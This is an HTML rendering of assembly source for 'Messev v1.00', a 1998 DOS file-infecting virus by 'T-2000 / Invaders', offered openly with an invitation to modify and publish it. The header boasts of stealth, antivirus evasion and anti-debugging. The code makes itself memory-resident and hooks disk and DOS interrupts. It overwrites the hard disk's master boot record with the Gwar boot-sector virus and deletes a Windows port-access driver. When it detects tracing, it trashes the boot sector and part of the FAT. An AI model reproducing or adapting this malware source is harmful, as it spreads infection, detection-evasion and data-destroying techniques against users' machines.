<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Virus.Multi.Messev.2778 - MESSEV.ASM.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc2 {
	color: #FF8000;
}
.sc4 {
	font-weight: bold;
	color: #000080;
}
.sc5 {
}
.sc6 {
	font-weight: bold;
	color: #0000FF;
}
.sc8 {
	font-weight: bold;
	color: #8080FF;
}
.sc9 {
	color: #0080FF;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc12 {
	color: #808000;
}
.sc13 {
	color: #808080;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">;============================================================================</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;     NAME: Messev v1.00</span><span class="sc0">
</span><span class="sc1">;     TYPE: Parasitic resident full stealth .EXE-infector.</span><span class="sc0">
</span><span class="sc1">;  PURPOSE: Designed to drop the [Gwar v1.10] bootsector-virus.</span><span class="sc0">
</span><span class="sc1">;     SIZE: Over 2776 bytes.</span><span class="sc0">
</span><span class="sc1">;   AUTHOR: T-2000 / Invaders.</span><span class="sc0">
</span><span class="sc1">;     DATE: March 1998 / May 1998.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  Capabilities:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       - Tunneling on INT 13h and INT 21h.</span><span class="sc0">
</span><span class="sc1">;       - Variable encrypting.</span><span class="sc0">
</span><span class="sc1">;       - Full stealth, (SFT-stealth however...).</span><span class="sc0">
</span><span class="sc1">;       - Drops bootsector-virus.</span><span class="sc0">
</span><span class="sc1">;       - Hides bootsectors/MBRs infected with Gwar.</span><span class="sc0">
</span><span class="sc1">;       - Completely invisible for TBSCAN (adds parameters, uses INTs).</span><span class="sc0">
</span><span class="sc1">;       - Anti-tracer: detects tracers (trashes bootsector).</span><span class="sc0">
</span><span class="sc1">;       - Disables stealth on execution archivers (works with PKZIP).</span><span class="sc0">
</span><span class="sc1">;       - Anti-debugging tricks.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  PROBLEMS:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  There are still some things to do, like:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       - Stealth filereads without SFT's.</span><span class="sc0">
</span><span class="sc1">;       - Determination of system-handles via IOCTL (function 44h). *DONE*</span><span class="sc0">
</span><span class="sc1">;       - Dummy-critical errorhandler.  *DONE*</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  BUGS:</span><span class="sc0">
</span><span class="sc1">;       - DEBUG crashes on exit after port-access.</span><span class="sc0">
</span><span class="sc1">;       - Stack isn't right in carrier.  *FIXED*</span><span class="sc0">
</span><span class="sc1">;       - ARJ exits with a Divide Error. *FIXED*</span><span class="sc0">
</span><span class="sc1">;       - The SBB causes some programs to crash (see above), despite</span><span class="sc0">
</span><span class="sc1">;         that it is correct. (fixed by removal).</span><span class="sc0">
</span><span class="sc1">;       - Invircible terminates with a runtime-error, this is caused</span><span class="sc0">
</span><span class="sc1">;         by hooking function 4301h (set file attributes).</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;  Can somebody tell me why the port-access is screwing things up?</span><span class="sc0">
</span><span class="sc1">;  It'sa real pain in mah ass!</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Structure: HOST + PADDING + VIRUS + PADDING + HEADER.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; This virus is dedicated to a very pretty woman who was on Dutch television,</span><span class="sc0">
</span><span class="sc1">; called 'Gallyon van Vessem'.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Since the stupid AV'ers don't assign a person's name to a virus, this</span><span class="sc0">
</span><span class="sc1">; one is not officially called 'Gallyon'. Instead 'Messev'.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Stealth-marker is 60 seconds.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Passes sanity-checks in anti-virus programs.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; When I got ready with Gwar, I've decided build it inside a file-infector,</span><span class="sc0">
</span><span class="sc1">; (nobody boots from a diskette nowadays). At first I thought of a Tai-Pan-</span><span class="sc0">
</span><span class="sc1">; hack, later I decided to write my own. It turned out to be the most stealth</span><span class="sc0">
</span><span class="sc1">; virus I ever programmed.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Some things were removed to make the virus a little more smaller:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       - Zero-track hiding.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Scanner detection:</span><span class="sc0">
</span><span class="sc1">;   - TbScan  :  Only the T-flag (invalid timestamp).</span><span class="sc0">
</span><span class="sc1">;   - F-Prot  :  Possible variant of Desperado (dis is not a hack Goddammit!)</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; Some parts may look a bit messy, this is due optimization.</span><span class="sc0">
</span><span class="sc1">; Also excuse me if there is some bad English in this source.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; My E-Mail: T2000_@HotMail.Com</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; To whoever who has dis source: U can do with it whatever U want:</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       - Modify it, (just give me credit)</span><span class="sc0">
</span><span class="sc1">;       - Publish it,</span><span class="sc0">
</span><span class="sc1">;       - Stick it where da sun doesn't shine.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">; LAST REMARKS: I hope 2B on #VIRUS very soon!</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;============================================================================</span><span class="sc0">

        </span><span class="sc9">.MODEL</span><span class="sc0">  </span><span class="sc10">TINY</span><span class="sc0">
        </span><span class="sc9">.STACK</span><span class="sc0">  </span><span class="sc2">4096</span><span class="sc0">
        </span><span class="sc9">.CODE</span><span class="sc0">


        </span><span class="sc9">ORG</span><span class="sc0">     </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">Virus_Size</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">Virus_End</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">Virus_Begin</span><span class="sc0">
</span><span class="sc5">Virus_Mem_Size</span><span class="sc0">  </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc4">((</span><span class="sc5">Virus_Size</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">128</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc0"> </span><span class="sc2">16</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">Marker_Mem</span><span class="sc0">      </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">921Fh</span><span class="sc0">
</span><span class="sc5">Marker_File</span><span class="sc0">     </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">0F0B1h</span><span class="sc0">
</span><span class="sc5">Residency_Check</span><span class="sc0"> </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">0DCD0h</span><span class="sc0">
</span><span class="sc5">Bios</span><span class="sc0">            </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">13h</span><span class="sc0">
</span><span class="sc5">Dos</span><span class="sc0">             </span><span class="sc9">EQU</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

</span><span class="sc5">Virus_Begin</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc5">Gwar_Boot</span><span class="sc4">:</span><span class="sc0">      </span><span class="sc9">INCLUDE</span><span class="sc0"> </span><span class="sc5">GWAR.ASM</span><span class="sc0">                </span><span class="sc1">; Bootsector-virus.</span><span class="sc0">

</span><span class="sc5">Entry</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">CLI</span><span class="sc0">                             </span><span class="sc1">; Detect if a tracer is used.</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">SP</span><span class="sc0">
        </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">SP</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">
        </span><span class="sc6">STI</span><span class="sc0">

        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">                  </span><span class="sc1">; Word correct?</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">      </span><span class="sc5">Not_Traced</span><span class="sc0">              </span><span class="sc1">; Then continue execution.</span><span class="sc0">


        </span><span class="sc1">; === Our retaliation ===</span><span class="sc0">

</span><span class="sc5">Trash_RAM</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc5">Trace_Mode</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Bios</span><span class="sc0">        </span><span class="sc1">; Find BIOS-entrypoint.</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Tracer</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0301h</span><span class="sc0">               </span><span class="sc1">; Trash bootsector &amp; part</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">                 </span><span class="sc1">; of FAT with garbage.</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0180h</span><span class="sc0">               </span><span class="sc1">; (don't hurt our child).</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">BiosInt</span><span class="sc0">

        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">19h</span><span class="sc0">                     </span><span class="sc1">; Reboot system.</span><span class="sc0">

</span><span class="sc5">Not_Traced</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Residency_Check</span><span class="sc0">     </span><span class="sc1">; Call residency-check.</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Marker_Mem</span><span class="sc0">          </span><span class="sc1">; Are we already TSR?</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">Make_Resident</span><span class="sc0">

</span><span class="sc5">Exec_Host</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Pop_All</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ES</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">                 </span><span class="sc1">; Plus PSP.</span><span class="sc0">

        </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">Old_Entry</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">      </span><span class="sc1">; Add effective segment.</span><span class="sc0">
        </span><span class="sc6">ADD</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">Old_Stack</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc0">      </span><span class="sc1">; Plus old SS.</span><span class="sc0">

        </span><span class="sc6">CLI</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">SS</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">                  </span><span class="sc1">; Restore stack.</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">SP</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">Old_Stack</span><span class="sc0">
        </span><span class="sc6">STI</span><span class="sc0">

        </span><span class="sc1">;IN      AL, 21h                 ; Unlock keyboard.</span><span class="sc0">
        </span><span class="sc1">;AND     AL, NOT 02h</span><span class="sc0">
        </span><span class="sc1">;OUT     21h, AL</span><span class="sc0">

        </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AX</span><span class="sc0">                  </span><span class="sc1">; Clear AX.</span><span class="sc0">

        </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc4">:</span><span class="sc5">Old_Entry</span><span class="sc0">  </span><span class="sc1">; JMP to host.</span><span class="sc0">

</span><span class="sc5">Make_Resident</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">62h</span><span class="sc0">                 </span><span class="sc1">; Get PSP, (screws some</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">                     </span><span class="sc1">; debuggers).</span><span class="sc0">

        </span><span class="sc6">DEC</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">                      </span><span class="sc1">; Get our MCB.</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">BX</span><span class="sc0">

        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'Z'</span><span class="sc0">    </span><span class="sc1">; We want the last MCB.</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">Exec_Host</span><span class="sc0">               </span><span class="sc1">; Don't install when not.</span><span class="sc0">

        </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">03h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">Virus_Mem_Size</span><span class="sc0">
        </span><span class="sc6">SUB</span><span class="sc0">     </span><span class="sc10">WORD</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">12h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">Virus_Mem_Size</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">ES</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DS</span><span class="sc4">:[</span><span class="sc2">12h</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">

        </span><span class="sc6">CLD</span><span class="sc0">                             </span><span class="sc1">; Copy virus to high-mem.</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">SI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">SI</span><span class="sc0">
        </span><span class="sc6">XOR</span><span class="sc0">     </span><span class="sc8">DI</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">DI</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Virus_Size</span><span class="sc0">
        </span><span class="sc6">REP</span><span class="sc0">     </span><span class="sc6">MOVSB</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">Relocated2</span><span class="sc0">

        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">ES</span><span class="sc0">                      </span><span class="sc1">; JMP to relocated virus.</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">AX</span><span class="sc0">
        </span><span class="sc6">RETF</span><span class="sc0">

        </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'=[ Messev v1.00, (c) 1998 by T-2000 / Invaders ]='</span><span class="sc0">

</span><span class="sc5">Relocated2</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">CS</span><span class="sc0">
        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">DS</span><span class="sc0">

</span><span class="sc1">; Status: Bits</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc1">;       0  Infect mode.</span><span class="sc0">
</span><span class="sc1">;       1  Filesize stealth mode.</span><span class="sc0">
</span><span class="sc1">;       2  Read-stealth mode.</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc5">Status</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00000011b</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3000h</span><span class="sc0">               </span><span class="sc1">; Get DOS-version (OEM).</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">21h</span><span class="sc0">

        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">BH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">                </span><span class="sc1">; Microsoft MS-DOS?</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">      </span><span class="sc5">SFT_Supported</span><span class="sc0">

        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">BH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0EEh</span><span class="sc0">                </span><span class="sc1">; Digital Research DR-DOS?</span><span class="sc0">
        </span><span class="sc6">JNE</span><span class="sc0">     </span><span class="sc5">No_SFTs</span><span class="sc0">

</span><span class="sc5">SFT_Supported</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">OR</span><span class="sc0">      </span><span class="sc5">Status</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">00000100b</span><span class="sc0">       </span><span class="sc1">; Read-stealth enabled.</span><span class="sc0">

</span><span class="sc5">No_SFTs</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Status</span><span class="sc0">              </span><span class="sc1">; Save initial status.</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc5">Init_Status</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">AL</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc5">Trace_Mode</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Dos</span><span class="sc0">         </span><span class="sc1">; Find DOS-entrypoint.</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Tracer</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc5">Trace_Mode</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Bios</span><span class="sc0">        </span><span class="sc1">; Find BIOS-entrypoint.</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Tracer</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13h</span><span class="sc0">                 </span><span class="sc1">; Hook INT 13h.</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">Stealth_Int13h</span><span class="sc0">  </span><span class="sc1">; Stealth-handler for MBR.</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">SetInt</span><span class="sc0">

        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">Gwar_Dropper</span><span class="sc0">            </span><span class="sc1">; Install our lil' present.</span><span class="sc0">
        </span><span class="sc6">NOP</span><span class="sc0">                             </span><span class="sc1">; Leave dis here!</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">21h</span><span class="sc0">                 </span><span class="sc1">; Hook INT 21h.</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">NewInt21h</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">CS</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">SetInt</span><span class="sc0">

        </span><span class="sc6">JMP</span><span class="sc0">     </span><span class="sc5">Exec_Host</span><span class="sc0">

</span><span class="sc1">; See if Gwar is already installed, or else install.</span><span class="sc0">
</span><span class="sc1">; Because we use the tunnelled vector, we can read beyond Gwar's stealth.</span><span class="sc0">
</span><span class="sc5">Gwar_Dropper</span><span class="sc4">:</span><span class="sc0">


</span><span class="sc1">; Delete port-access driver, so Gwar can infect under Win95. (Same method</span><span class="sc0">
</span><span class="sc1">; as used in Hare virus).</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">41h</span><span class="sc0">                 </span><span class="sc1">; Delete driver.</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">Port_Driver</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">DosInt</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">Marker_Mem_Gwar</span><span class="sc0">     </span><span class="sc1">; Gwar residency-check.</span><span class="sc0">
        </span><span class="sc6">INT</span><span class="sc0">     </span><span class="sc2">13h</span><span class="sc0">

        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc6">NOT</span><span class="sc0"> </span><span class="sc5">Marker_Mem_Gwar</span><span class="sc0"> </span><span class="sc1">; Gwar resident?</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">      </span><span class="sc5">Exit_Installer</span><span class="sc0">          </span><span class="sc1">; If so, don't install.</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AH</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Dh</span><span class="sc0">                 </span><span class="sc1">; Reset harddisk.</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DL</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">BiosInt</span><span class="sc0">

        </span><span class="sc6">POP</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc0">                      </span><span class="sc1">; POP return address to BX.</span><span class="sc0">
        </span><span class="sc6">PUSH</span><span class="sc0">    </span><span class="sc8">BX</span><span class="sc0">                      </span><span class="sc1">; PUSH it back.</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc10">BYTE</span><span class="sc0"> </span><span class="sc9">PTR</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">90h</span><span class="sc0">      </span><span class="sc1">; Remove breakpoint.</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0201h</span><span class="sc0">               </span><span class="sc1">; Read MBR of 1st harddisk.</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">Buffer</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">BiosInt</span><span class="sc0">
        </span><span class="sc6">JC</span><span class="sc0">      </span><span class="sc5">Exit_Installer</span><span class="sc0">

        </span><span class="sc6">CMP</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">BX</span><span class="sc4">+</span><span class="sc5">Signature</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc5">Marker_Boot</span><span class="sc0">     </span><span class="sc1">; Already infected?</span><span class="sc0">
        </span><span class="sc6">JE</span><span class="sc0">      </span><span class="sc5">Exit_Installer</span><span class="sc0">                  </span><span class="sc1">; Then abort drop.</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0301h</span><span class="sc0">               </span><span class="sc1">; Store original MBR.</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">02h</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">BiosInt</span><span class="sc0">
        </span><span class="sc6">JC</span><span class="sc0">      </span><span class="sc5">Exit_Installer</span><span class="sc0">

        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">AX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0301h</span><span class="sc0">               </span><span class="sc1">; Write Gwar to MBR.</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">BX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">OFFSET</span><span class="sc0"> </span><span class="sc5">Gwar_Boot</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">CX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">01h</span><span class="sc0">
        </span><span class="sc6">MOV</span><span class="sc0">     </span><span class="sc8">DX</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">
        </span><span class="sc6">CALL</span><span class="sc0">    </span><span class="sc5">BiosInt</span><span class="sc0">

</span><span class="sc5">Exit_Installer</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">RETN</span><span class="sc0">

